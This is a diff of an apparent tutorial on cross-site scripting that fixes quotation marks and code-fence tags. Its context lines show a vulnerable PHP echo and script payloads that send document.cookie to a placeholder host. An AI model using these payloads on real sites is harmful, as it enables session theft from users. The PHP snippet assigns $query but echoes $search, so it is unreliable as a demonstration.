@@ -20,8 +20,8 @@ Consider the following code snippet:
 
 ```php
   <?php
-    $query = $_GET[‘search’];
-    echo “Results for: $search”; 
+    $query = $_GET['search'];
+    echo "Results for: $search"; 
   ?>
 ```
 The XSS payload would be stored within the $query variable and then executed as it is reflected onto the page.
@@ -44,13 +44,13 @@ While Flash and ActiveX can also be vectors for XSS, today, it tends to be javas
 Generally, &lt;script&gt;alert(1)&lt;/script&gt; is used to test for the vulnerability to see if it is exploitable. 
 
 The following code snippets may also be seen:
-```javascript
+```
 <script>
   let image = new Image(); 
   image.src='http://example.com?c='+document.cookie;
 </script>
 ```
-```javascript
+```
 <script>
   document.location="http://example.com?c="+document.cookie;
 </script>
